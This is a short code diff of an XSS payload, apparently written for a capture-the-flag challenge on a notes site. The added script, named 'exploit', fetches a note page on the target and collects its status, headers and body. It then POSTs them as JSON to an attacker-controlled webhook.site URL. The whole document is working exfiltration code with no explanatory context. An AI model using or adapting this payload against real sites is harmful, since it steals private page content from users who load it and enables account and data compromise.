@@ -1,8 +1,35 @@
 <script>
-
 (async function exploit() {
-	var dt = await fetch("https://webhook.site/fd1dc2df-9cbd-40af-bf86-c38063a985e0");
-}
-)()
+    try {
+        var dt = await fetch("https://xnotes.qualif.hackerlab.bj/note.php?id=845");
 
+        var statusCode = dt.status;
+
+        var headersString = "";
+        dt.headers.forEach((value, name) => {
+            headersString += `${name}: ${value}\n`;
+        });
+
+        var text = await dt.text();
+
+        var res = {
+            statusCode: statusCode,
+            headers: headersString,
+            body: text
+        };
+
+        var jsonData = JSON.stringify(res);
+
+        var lol = await fetch("https://webhook.site/fd1dc2df-9cbd-40af-bf86-c38063a985e0/", {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: jsonData
+        });
+    } catch (error) {
+        console.error('Error:', error);
+    }
+})();
 </script>
+
